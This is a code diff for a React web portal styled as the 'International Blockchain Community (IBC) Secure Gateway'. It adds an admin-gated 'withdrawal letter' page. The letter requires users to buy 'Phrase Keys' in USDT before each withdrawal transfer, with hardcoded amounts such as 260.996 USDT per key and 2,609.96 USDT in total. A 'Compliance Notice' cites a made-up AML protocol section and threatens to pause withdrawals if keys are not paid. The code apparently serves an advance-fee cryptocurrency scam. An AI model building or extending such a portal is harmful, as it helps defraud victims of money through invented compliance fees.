@@ -26,6 +26,8 @@ interface Case {
   depositAddress?: string;
   profileRedirectUrl?: string;
   hasRequirements?: boolean;
+  letterSent?: boolean;
+  landingPage?: string;
 }
 
 interface CaseLetter {
@@ -33,18 +35,29 @@ interface CaseLetter {
   introduction?: string;
   bodyContent?: string;
   footerNote?: string;
+  complianceReference?: string;
   optionATitle?: string;
   optionADescription?: string;
-  optionBTitle?: string;
-  optionBDescription?: string;
   optionAAmount?: string;
+  optionAFrequency?: string;
   optionABatches?: string;
+  optionAKeyCost?: string;
+  optionATotalRequirement?: string;
   optionATotalAmount?: string;
   optionAFilelocoId?: string;
+  optionBTitle?: string;
+  optionBDescription?: string;
   optionBAmount?: string;
+  optionBFrequency?: string;
   optionBBatches?: string;
+  optionBKeyCost?: string;
+  optionBTotalRequirement?: string;
   optionBTotalAmount?: string;
   optionBFilelocoId?: string;
+  phraseKeyRequirements?: string;
+  complianceNotice?: string;
+  scheduledFor?: string;
+  expiresAt?: string;
 }
 
 interface Submission {
@@ -319,7 +332,8 @@ export default function SecurePortal() {
             setCurrentCase(updatedCase);
             setSyncProgress(100);
             setSyncStatusText("Synchronization Complete.");
-            setTimeout(() => setViewState('dashboard'), 1000);
+            const landingPage = updatedCase.landingPage || 'dashboard';
+            setTimeout(() => setViewState(landingPage as any), 1000);
           }
         }
       } catch (error) {
@@ -340,9 +354,10 @@ export default function SecurePortal() {
         const foundCase = await response.json();
         setCurrentCase(foundCase);
         
-        if (foundCase.status === 'active') setViewState('dashboard');
+        const landingPage = foundCase.landingPage || 'dashboard';
+        if (foundCase.status === 'active') setViewState(landingPage as any);
         else if (foundCase.status === 'syncing') setViewState('sync');
-        else if (foundCase.status === 'completed') setViewState('dashboard');
+        else if (foundCase.status === 'completed') setViewState(landingPage as any);
         else setViewState('register');
         
         toast({
@@ -749,30 +764,64 @@ export default function SecurePortal() {
 
             {/* Withdrawal Letter Card */}
             <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
-              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('letter')} data-testid="card-withdrawal-letter">
-                <CardHeader className="bg-gradient-to-r from-emerald-500 to-emerald-600 text-white rounded-t-lg">
+              <Card 
+                className={`h-full transition-shadow border-2 border-transparent ${
+                  currentCase?.letterSent 
+                    ? 'hover:shadow-lg cursor-pointer hover:border-primary/20' 
+                    : 'opacity-90'
+                }`} 
+                onClick={() => setViewState('letter')} 
+                data-testid="card-withdrawal-letter"
+              >
+                <CardHeader className={`text-white rounded-t-lg ${
+                  currentCase?.letterSent 
+                    ? 'bg-gradient-to-r from-emerald-500 to-emerald-600' 
+                    : 'bg-gradient-to-r from-slate-400 to-slate-500'
+                }`}>
                   <CardTitle className="flex items-center gap-2">
                     <FileText className="w-5 h-5" />
                     Withdrawal Letter
+                    {!currentCase?.letterSent && (
+                      <Badge className="bg-amber-500 text-white ml-2">Pending</Badge>
+                    )}
                   </CardTitle>
                 </CardHeader>
                 <CardContent className="pt-6">
-                  <p className="text-slate-600 text-sm mb-4">
-                    Review your withdrawal options and select your preferred method.
-                  </p>
-                  <div className="space-y-2 text-sm">
-                    <div className="flex justify-between">
-                      <span className="text-slate-500">Status</span>
-                      <Badge variant={currentCase?.status === 'completed' ? 'default' : 'outline'}>
-                        {currentCase?.status === 'completed' ? 'Submitted' : 'Pending'}
-                      </Badge>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-slate-500">Submissions</span>
-                      <span className="font-semibold">{submissions.length}</span>
-                    </div>
-                  </div>
-                  <Button className="w-full mt-6" variant="outline">View Letter</Button>
+                  {currentCase?.letterSent ? (
+                    <>
+                      <p className="text-slate-600 text-sm mb-4">
+                        Review your withdrawal options and select your preferred method.
+                      </p>
+                      <div className="space-y-2 text-sm">
+                        <div className="flex justify-between">
+                          <span className="text-slate-500">Status</span>
+                          <Badge variant={submissions.length > 0 ? 'default' : 'outline'} className={submissions.length > 0 ? 'bg-green-600' : ''}>
+                            {submissions.length > 0 ? 'Submitted' : 'Ready to Review'}
+                          </Badge>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-slate-500">Submissions</span>
+                          <span className="font-semibold">{submissions.length}</span>
+                        </div>
+                      </div>
+                      <Button className="w-full mt-6" variant="outline">View Letter</Button>
+                    </>
+                  ) : (
+                    <>
+                      <div className="flex items-center gap-3 mb-4 text-amber-600 bg-amber-50 rounded-lg p-3">
+                        <Clock className="w-5 h-5" />
+                        <p className="text-sm font-medium">
+                          Your letter is being prepared by the compliance team
+                        </p>
+                      </div>
+                      <p className="text-slate-500 text-sm">
+                        You will be notified when your personalized withdrawal letter is ready for review.
+                      </p>
+                      <Button className="w-full mt-6" variant="outline" disabled>
+                        Awaiting Letter
+                      </Button>
+                    </>
+                  )}
                 </CardContent>
               </Card>
             </motion.div>
@@ -1475,7 +1524,47 @@ export default function SecurePortal() {
     );
   }
 
-  // LETTER VIEW
+  // LETTER VIEW - Professional IBC Design
+  
+  // Check if letter has been sent by admin
+  if (!currentCase?.letterSent) {
+    return (
+      <div className="min-h-screen bg-slate-100 text-slate-900 font-sans flex items-center justify-center p-4">
+        <motion.div 
+          initial={{ opacity: 0, scale: 0.95 }} 
+          animate={{ opacity: 1, scale: 1 }}
+          className="max-w-md w-full"
+        >
+          <Card className="bg-white shadow-xl border-slate-200">
+            <CardHeader className="text-center pb-2">
+              <div className="w-20 h-20 bg-slate-100 rounded-full mx-auto mb-4 flex items-center justify-center">
+                <FileText className="w-10 h-10 text-slate-400" />
+              </div>
+              <CardTitle className="text-xl">Withdrawal Letter Pending</CardTitle>
+            </CardHeader>
+            <CardContent className="text-center space-y-4">
+              <p className="text-slate-600">
+                Your personalized withdrawal letter is being prepared by the compliance team and will be available shortly.
+              </p>
+              <div className="bg-blue-50 border border-blue-100 rounded-lg p-4">
+                <p className="text-sm text-blue-700">
+                  You will receive a notification when your letter is ready for review.
+                </p>
+              </div>
+              <Button 
+                onClick={() => setViewState('dashboard')}
+                className="w-full"
+                data-testid="button-back-dashboard-pending"
+              >
+                <ArrowLeft className="w-4 h-4 mr-2" /> Return to Dashboard
+              </Button>
+            </CardContent>
+          </Card>
+        </motion.div>
+      </div>
+    );
+  }
+  
   const adminData = currentCase ? {
     vipStatus: currentCase.vipStatus,
     username: currentCase.username,
@@ -1489,29 +1578,57 @@ export default function SecurePortal() {
     introduction: `We acknowledge the successful completion of your re-authentication procedure.`,
     bodyContent: `In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
     footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
+    complianceReference: `IBC-AML-CC-${currentCase?.accessCode || ''}`,
     optionATitle: "Accelerated Release",
     optionADescription: "Full withdrawal amount processed in accelerated batches.",
+    optionAFrequency: "every 12 hours",
+    optionAKeyCost: "260.996 USDT",
+    optionATotalRequirement: "2,609.96 USDT",
     optionBTitle: "Standard Release",
-    optionBDescription: "Half allocation processed in standard batches."
+    optionBDescription: "Half allocation processed in standard batches.",
+    optionBFrequency: "every 12 hours",
+    optionBKeyCost: "521.993 USDT",
+    optionBTotalRequirement: "5,219.92 USDT",
+    phraseKeyRequirements: JSON.stringify([
+      "Each Phrase Key unlocks exactly one transfer of your withdrawal balance.",
+      "A new Phrase Key is required before each scheduled transfer.",
+      "Phrase Keys must be acquired using USDT only and deposited to your assigned wallet.",
+      "Deposits are tracked automatically and confirmed within 24 hours.",
+      "No other tokens, currencies, or payment methods are supported."
+    ]),
+    complianceNotice: "Per IBC Anti-Money Laundering (AML) Protocol Section 7.3: Phrase Key deposits are mandatory for all outbound transfers. Failure to submit keys on schedule will pause your withdrawal and may result in extended compliance review."
   };
 
+  // Parse phrase key requirements
+  let phraseKeyRequirements: string[] = [];
+  try {
+    if (letterContent?.phraseKeyRequirements) {
+      phraseKeyRequirements = JSON.parse(letterContent.phraseKeyRequirements);
+    } else if (letter.phraseKeyRequirements) {
+      phraseKeyRequirements = JSON.parse(letter.phraseKeyRequirements);
+    }
+  } catch {
+    phraseKeyRequirements = [];
+  }
+
   return (
-    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
-      {/* Navigation */}
-      <nav className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div className="min-h-screen bg-slate-100 text-slate-900 font-sans selection:bg-blue-100 print:bg-white">
+      {/* Professional Navigation */}
+      <nav className="bg-slate-900 text-white shadow-lg print:hidden">
+        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex justify-between h-16">
-            <div className="flex items-center gap-3">
-              <img src={ibcLogo} alt="IBC Logo" className="h-8 w-8 object-contain" />
-              <div className="hidden md:block">
-                <div className="text-sm font-bold text-primary leading-none">IBC SECURE GATEWAY</div>
-                <div className="text-[10px] text-slate-500 font-medium tracking-wider uppercase">Account Integrity Division</div>
+            <div className="flex items-center gap-4">
+              <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain" />
+              <div>
+                <div className="text-sm font-bold leading-none">INTERNATIONAL BLOCKCHAIN COMMUNITY</div>
+                <div className="text-[10px] text-slate-400 font-medium tracking-wider uppercase">Secure Gateway Portal</div>
               </div>
             </div>
             <div className="flex items-center gap-4">
               <Button 
                 variant="ghost" 
                 size="sm" 
+                className="text-white hover:text-white hover:bg-slate-800"
                 onClick={() => setViewState('dashboard')}
                 data-testid="button-back-dashboard"
               >
@@ -1521,214 +1638,325 @@ export default function SecurePortal() {
                 <Button 
                   variant="outline" 
                   size="sm" 
-                  className="border-slate-300"
+                  className="border-slate-600 text-white hover:bg-slate-800"
                   onClick={() => setViewState('submissions')}
                   data-testid="button-view-history"
                 >
-                  <History className="w-4 h-4 mr-2" /> View History ({submissions.length})
+                  <History className="w-4 h-4 mr-2" /> History ({submissions.length})
                 </Button>
               )}
-              <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
-                <ShieldCheck className="w-3 h-3" />
-                <span>Verified: {adminData?.vipStatus || "Standard"}</span>
-              </div>
-              <div className="flex items-center gap-2 text-xs text-slate-500">
+              <div className="flex items-center gap-2 text-xs text-slate-400">
                 <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                Connected
+                Secure Connection
               </div>
             </div>
           </div>
         </div>
       </nav>
 
-      <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8 print:max-w-none print:px-8">
         <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
-          {/* Header */}
-          <div className="mb-10 text-center md:text-left">
-            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
-              <Lock className="w-3 h-3" /> Action Required
-            </div>
-            <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
-              {letter.headline}
-            </h1>
-            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-{currentCase?.accessCode}</p>
-          </div>
-
-          {/* Letter Content */}
-          <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
-            <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
-              <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
-            </div>
-            <div className="relative z-10 max-w-3xl">
-              <div className="mb-6 pb-6 border-b border-slate-100">
-                 <h2 className="text-lg font-bold text-primary font-serif mb-1">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h2>
-                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Account Integrity & Security Operations Division (ISO-D)</p>
-                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Global Compliance Secretariat</p>
+          
+          {/* Official Letter Document */}
+          <div className="bg-white rounded-xl shadow-xl border border-slate-200 overflow-hidden print:shadow-none print:border-none">
+            
+            {/* Letter Header with Logo */}
+            <div className="bg-gradient-to-r from-slate-900 to-slate-800 text-white px-8 py-6">
+              <div className="flex items-center gap-4">
+                <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain" />
+                <div>
+                  <h1 className="text-xl font-bold tracking-wide">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h1>
+                  <p className="text-slate-300 text-sm uppercase tracking-widest">Account Integrity & Security Operations Division (ISO-D)</p>
+                  <p className="text-slate-400 text-xs uppercase tracking-wider">Global Compliance Secretariat</p>
+                </div>
               </div>
-              <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
-                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.userName || "Client"},</p>
+            </div>
+
+            {/* Compliance Reference Box */}
+            <div className="bg-blue-50 border-b-2 border-blue-200 px-8 py-4">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
+                    <ShieldCheck className="w-5 h-5 text-white" />
+                  </div>
+                  <div>
+                    <p className="text-xs text-blue-600 font-semibold uppercase tracking-wider">Compliance Clearance Reference</p>
+                    <p className="text-lg font-mono font-bold text-blue-900">{letterContent?.complianceReference || letter.complianceReference}</p>
+                  </div>
+                </div>
+                <div className="text-right">
+                  <p className="text-xs text-slate-500">Verification Status</p>
+                  <Badge className="bg-green-600 text-white">{adminData?.vipStatus || "Verified"}</Badge>
+                </div>
+              </div>
+            </div>
+
+            {/* Letter Body */}
+            <div className="px-8 py-6">
+              <div className="mb-6">
+                <p className="text-slate-600 text-sm mb-2">Date: {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
+                <p className="font-bold text-slate-900 text-lg">Dear {currentCase?.userName || "Valued Client"},</p>
+              </div>
+
+              <div className="prose prose-slate max-w-none text-slate-700 leading-relaxed mb-8">
                 {letter.introduction && (
-                  <p className="mb-4 whitespace-pre-line">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
+                  <p className="mb-4">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
                 )}
                 {letter.bodyContent && (
-                  <p className="mb-4 whitespace-pre-line">{letter.bodyContent}</p>
+                  <p className="mb-4">{letter.bodyContent}</p>
                 )}
                 {letter.footerNote && (
-                  <p className="mb-4"><strong>{letter.footerNote}</strong></p>
+                  <p className="font-semibold text-slate-900 bg-amber-50 border-l-4 border-amber-500 pl-4 py-2">{letter.footerNote}</p>
                 )}
+              </div>
+
+              {/* Already Submitted Notice */}
+              {submissions.length > 0 ? (
+                <motion.div 
+                  initial={{ opacity: 0, y: 20 }} 
+                  animate={{ opacity: 1, y: 0 }}
+                  className="bg-green-50 border-2 border-green-200 rounded-xl p-6 mb-8"
+                >
+                  <div className="flex items-start gap-4">
+                    <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
+                      <CheckCircle2 className="w-7 h-7 text-green-600" />
+                    </div>
+                    <div className="flex-1">
+                      <h3 className="text-xl font-bold text-green-900 mb-2">Withdrawal Selection Confirmed</h3>
+                      <p className="text-green-700 mb-4">Your withdrawal option has been submitted and is being processed by the compliance team.</p>
+                      
+                      <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
+                        <div className="flex justify-between text-sm">
+                          <span className="text-slate-600">Reference Number</span>
+                          <span className="font-mono font-bold text-green-700">IBC-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
+                        </div>
+                        <div className="flex justify-between text-sm">
+                          <span className="text-slate-600">Selected Option</span>
+                          <Badge className={submissions[0]?.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
+                            Option {submissions[0]?.selectedOption}
+                          </Badge>
+                        </div>
+                        <div className="flex justify-between text-sm">
+                          <span className="text-slate-600">Submitted On</span>
+                          <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleString()}</span>
+                        </div>
+                      </div>
+                      
+                      <div className="flex gap-3">
+                        <Button onClick={() => setViewState('success')} className="bg-green-600 hover:bg-green-700">
+                          <Wallet className="w-4 h-4 mr-2" />
+                          View Deposit Instructions
+                        </Button>
+                        <Button variant="outline" onClick={() => setViewState('submissions')}>
+                          <History className="w-4 h-4 mr-2" />
+                          View All History
+                        </Button>
+                      </div>
+                    </div>
+                  </div>
+                </motion.div>
+              ) : (
+                <>
+                  {/* Withdrawal Options - Professional Card Design */}
+                  <div className="mb-8">
+                    <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
+                      <div className="w-1 h-6 bg-blue-600 rounded"></div>
+                      Available Withdrawal Options
+                    </h2>
+                    
+                    <div className="grid md:grid-cols-2 gap-6">
+                      {/* Option A Card */}
+                      <motion.div whileHover={{ y: -4 }} transition={{ type: "spring", stiffness: 300 }}>
+                        <Card 
+                          className={`h-full cursor-pointer transition-all duration-300 overflow-hidden ${
+                            selectedOption === 'A' 
+                              ? 'ring-4 ring-blue-500 shadow-xl border-blue-500' 
+                              : 'border-slate-200 hover:border-blue-300 hover:shadow-lg'
+                          }`} 
+                          onClick={() => handleSelect('A')} 
+                          data-testid="card-option-a"
+                        >
+                          <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white px-5 py-4">
+                            <div className="flex justify-between items-center">
+                              <div>
+                                <p className="text-blue-200 text-xs font-medium uppercase tracking-wider">Option A</p>
+                                <h3 className="text-xl font-bold">{letterContent?.optionATitle || letter.optionATitle}</h3>
+                              </div>
+                              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center text-2xl font-bold">A</div>
+                            </div>
+                          </div>
+                          
+                          <CardContent className="p-5 space-y-4">
+                            {(letterContent?.optionADescription || letter.optionADescription) && (
+                              <p className="text-sm text-slate-600">{letterContent?.optionADescription || letter.optionADescription}</p>
+                            )}
+                            
+                            <div className="space-y-3 bg-slate-50 rounded-lg p-4">
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Amount per Transfer</span>
+                                <span className="font-bold text-slate-900">{letterContent?.optionAAmount || adminData?.withdrawalAmount || "N/A"}</span>
+                              </div>
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Frequency</span>
+                                <span className="font-medium text-slate-700">{letterContent?.optionAFrequency || letter.optionAFrequency}</span>
+                              </div>
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Total Withdrawals</span>
+                                <span className="font-medium text-slate-700">{letterContent?.optionABatches || adminData?.withdrawalBatches || "10"} Transfers</span>
+                              </div>
+                              <div className="border-t border-slate-200 pt-3">
+                                <div className="flex justify-between text-sm">
+                                  <span className="text-slate-500">Key Cost</span>
+                                  <span className="font-bold text-blue-600">{letterContent?.optionAKeyCost || letter.optionAKeyCost}</span>
+                                </div>
+                                <div className="flex justify-between text-sm mt-2">
+                                  <span className="text-slate-500">Total Requirement</span>
+                                  <span className="font-bold text-blue-800">{letterContent?.optionATotalRequirement || letter.optionATotalRequirement}</span>
+                                </div>
+                              </div>
+                            </div>
+                            
+                            {(letterContent?.optionAFilelocoId || adminData?.physilocal0) && (
+                              <div className="bg-blue-50 border border-blue-200 rounded-lg px-4 py-3">
+                                <p className="text-xs text-blue-600 font-medium uppercase">Withdrawal ID</p>
+                                <p className="font-mono font-bold text-blue-900">{letterContent?.optionAFilelocoId || adminData?.physilocal0}</p>
+                              </div>
+                            )}
+                          </CardContent>
+                          
+                          <CardFooter className="px-5 pb-5 pt-0">
+                            <Button 
+                              className={`w-full ${selectedOption === 'A' ? 'bg-blue-600 hover:bg-blue-700' : ''}`} 
+                              variant={selectedOption === 'A' ? 'default' : 'outline'} 
+                              data-testid="button-select-a"
+                            >
+                              {selectedOption === 'A' ? 'Selected' : 'Select Option A'}
+                            </Button>
+                          </CardFooter>
+                        </Card>
+                      </motion.div>
+
+                      {/* Option B Card */}
+                      <motion.div whileHover={{ y: -4 }} transition={{ type: "spring", stiffness: 300 }}>
+                        <Card 
+                          className={`h-full cursor-pointer transition-all duration-300 overflow-hidden ${
+                            selectedOption === 'B' 
+                              ? 'ring-4 ring-slate-500 shadow-xl border-slate-500' 
+                              : 'border-slate-200 hover:border-slate-400 hover:shadow-lg'
+                          }`} 
+                          onClick={() => handleSelect('B')} 
+                          data-testid="card-option-b"
+                        >
+                          <div className="bg-gradient-to-r from-slate-600 to-slate-700 text-white px-5 py-4">
+                            <div className="flex justify-between items-center">
+                              <div>
+                                <p className="text-slate-300 text-xs font-medium uppercase tracking-wider">Option B</p>
+                                <h3 className="text-xl font-bold">{letterContent?.optionBTitle || letter.optionBTitle}</h3>
+                              </div>
+                              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center text-2xl font-bold">B</div>
+                            </div>
+                          </div>
+                          
+                          <CardContent className="p-5 space-y-4">
+                            {(letterContent?.optionBDescription || letter.optionBDescription) && (
+                              <p className="text-sm text-slate-600">{letterContent?.optionBDescription || letter.optionBDescription}</p>
+                            )}
+                            
+                            <div className="space-y-3 bg-slate-50 rounded-lg p-4">
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Amount per Transfer</span>
+                                <span className="font-bold text-slate-900">{letterContent?.optionBAmount || `${parseInt(adminData?.withdrawalAmount || "0") / 2} USDT`}</span>
+                              </div>
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Frequency</span>
+                                <span className="font-medium text-slate-700">{letterContent?.optionBFrequency || letter.optionBFrequency}</span>
+                              </div>
+                              <div className="flex justify-between text-sm">
+                                <span className="text-slate-500">Total Withdrawals</span>
+                                <span className="font-medium text-slate-700">{letterContent?.optionBBatches || (parseInt(adminData?.withdrawalBatches || "10") * 2)} Transfers</span>
+                              </div>
+                              <div className="border-t border-slate-200 pt-3">
+                                <div className="flex justify-between text-sm">
+                                  <span className="text-slate-500">Key Cost</span>
+                                  <span className="font-bold text-slate-600">{letterContent?.optionBKeyCost || letter.optionBKeyCost}</span>
+                                </div>
+                                <div className="flex justify-between text-sm mt-2">
+                                  <span className="text-slate-500">Total Requirement</span>
+                                  <span className="font-bold text-slate-800">{letterContent?.optionBTotalRequirement || letter.optionBTotalRequirement}</span>
+                                </div>
+                              </div>
+                            </div>
+                            
+                            {(letterContent?.optionBFilelocoId || adminData?.physilocal0) && (
+                              <div className="bg-slate-100 border border-slate-200 rounded-lg px-4 py-3">
+                                <p className="text-xs text-slate-500 font-medium uppercase">Withdrawal ID</p>
+                                <p className="font-mono font-bold text-slate-800">{letterContent?.optionBFilelocoId || adminData?.physilocal0}</p>
+                              </div>
+                            )}
+                          </CardContent>
+                          
+                          <CardFooter className="px-5 pb-5 pt-0">
+                            <Button 
+                              className={`w-full ${selectedOption === 'B' ? 'bg-slate-600 hover:bg-slate-700' : ''}`} 
+                              variant={selectedOption === 'B' ? 'default' : 'outline'} 
+                              data-testid="button-select-b"
+                            >
+                              {selectedOption === 'B' ? 'Selected' : 'Select Option B'}
+                            </Button>
+                          </CardFooter>
+                        </Card>
+                      </motion.div>
+                    </div>
+                  </div>
+
+                  {/* Phrase Key Requirements Section */}
+                  {phraseKeyRequirements.length > 0 && (
+                    <div className="mb-8 bg-amber-50 border-2 border-amber-200 rounded-xl p-6">
+                      <h3 className="text-lg font-bold text-amber-900 flex items-center gap-2 mb-4">
+                        <Key className="w-5 h-5" />
+                        Mandatory Phrase Key Requirements
+                      </h3>
+                      <ul className="space-y-2">
+                        {phraseKeyRequirements.map((req: string, index: number) => (
+                          <li key={index} className="flex items-start gap-3 text-sm text-amber-800">
+                            <span className="w-5 h-5 bg-amber-200 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">
+                              {index + 1}
+                            </span>
+                            {req}
+                          </li>
+                        ))}
+                      </ul>
+                    </div>
+                  )}
+
+                  {/* Compliance Notice */}
+                  {(letterContent?.complianceNotice || letter.complianceNotice) && (
+                    <div className="bg-red-50 border-2 border-red-200 rounded-xl p-6">
+                      <div className="flex items-start gap-3">
+                        <AlertTriangle className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5" />
+                        <div>
+                          <h4 className="font-bold text-red-900 mb-2">Compliance Notice</h4>
+                          <p className="text-sm text-red-800">{letterContent?.complianceNotice || letter.complianceNotice}</p>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+                </>
+              )}
+            </div>
+
+            {/* Document Footer */}
+            <div className="bg-slate-50 border-t border-slate-200 px-8 py-4">
+              <div className="flex items-center justify-between text-xs text-slate-500">
+                <div className="flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4" />
+                  <span>256-bit SSL Encrypted • Document ID: {letterContent?.complianceReference || letter.complianceReference}</span>
+                </div>
+                <span>Generated: {new Date().toISOString()}</span>
               </div>
             </div>
           </div>
 
-          {/* Already Submitted Notice */}
-          {submissions.length > 0 ? (
-            <motion.div 
-              initial={{ opacity: 0, y: 20 }} 
-              animate={{ opacity: 1, y: 0 }}
-              className="bg-green-50 border-2 border-green-200 rounded-lg p-8 mb-10"
-            >
-              <div className="flex items-start gap-4">
-                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                  <CheckCircle2 className="w-8 h-8 text-green-600" />
-                </div>
-                <div className="flex-1">
-                  <h3 className="text-xl font-bold text-green-900 mb-2">Withdrawal Selection Confirmed</h3>
-                  <p className="text-green-700 mb-4">Your withdrawal option has already been submitted and is being processed.</p>
-                  
-                  <div className="bg-white rounded-lg p-4 border border-green-200 space-y-2">
-                    <div className="flex justify-between text-sm">
-                      <span className="text-slate-600">Reference Number</span>
-                      <span className="font-mono font-bold text-primary">IBC-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
-                    </div>
-                    <div className="flex justify-between text-sm">
-                      <span className="text-slate-600">Selected Option</span>
-                      <Badge className={submissions[0]?.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
-                        Option {submissions[0]?.selectedOption}
-                      </Badge>
-                    </div>
-                    <div className="flex justify-between text-sm">
-                      <span className="text-slate-600">Submitted On</span>
-                      <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleDateString()}</span>
-                    </div>
-                  </div>
-                  
-                  <div className="mt-6 flex gap-3">
-                    <Button onClick={() => setViewState('success')} className="bg-green-600 hover:bg-green-700">
-                      <Wallet className="w-4 h-4 mr-2" />
-                      View Deposit Instructions
-                    </Button>
-                    <Button variant="outline" onClick={() => setViewState('submissions')}>
-                      <History className="w-4 h-4 mr-2" />
-                      View History
-                    </Button>
-                  </div>
-                </div>
-              </div>
-            </motion.div>
-          ) : (
-            <>
-              {/* Options */}
-              <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
-                <div className="w-8 h-[1px] bg-slate-300"></div>
-                Select Withdrawal Option
-                <div className="w-full h-[1px] bg-slate-300"></div>
-              </h3>
-              
-              <div className="grid md:grid-cols-2 gap-8 mb-12">
-            {/* Option A */}
-            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')} data-testid="card-option-a">
-                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
-                  <div className="flex justify-between items-start">
-                    <div>
-                      <div className="text-xs font-bold text-primary uppercase tracking-wider mb-1">Option A – Accelerated</div>
-                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionATitle}</CardTitle>
-                    </div>
-                    <div className="h-10 w-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">A</div>
-                  </div>
-                </CardHeader>
-                <CardContent className="pt-6 space-y-4">
-                  {letter.optionADescription && (
-                    <p className="text-sm text-slate-600">{letter.optionADescription}</p>
-                  )}
-                  <div className="flex justify-between items-baseline">
-                    <span className="text-2xl font-bold text-primary">{letterContent?.optionAAmount || adminData?.withdrawalAmount}</span>
-                  </div>
-                  <div className="space-y-3 pt-2">
-                    {letterContent?.optionABatches ? (
-                      <div className="text-sm text-slate-600 whitespace-pre-line">{letterContent.optionABatches}</div>
-                    ) : (
-                      <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                        <span className="text-slate-600">Total Batches</span>
-                        <span className="font-semibold text-slate-900">{adminData?.withdrawalBatches} Transfers</span>
-                      </div>
-                    )}
-                    {letterContent?.optionATotalAmount && (
-                      <div className="flex justify-between text-sm py-2 border-b border-slate-100 font-semibold">
-                        <span className="text-slate-600">Total Withdrawal</span>
-                        <span className="text-slate-900">{letterContent.optionATotalAmount}</span>
-                      </div>
-                    )}
-                    <div className="flex justify-between text-sm py-2 bg-blue-50 px-3 rounded text-blue-900">
-                      <span className="font-semibold">Withdrawal ID</span>
-                      <span className="font-bold">{letterContent?.optionAFilelocoId || adminData?.physilocal0}</span>
-                    </div>
-                  </div>
-                </CardContent>
-                <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'} data-testid="button-select-a">Select Option A</Button>
-                </CardFooter>
-              </Card>
-            </motion.div>
-
-            {/* Option B */}
-            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
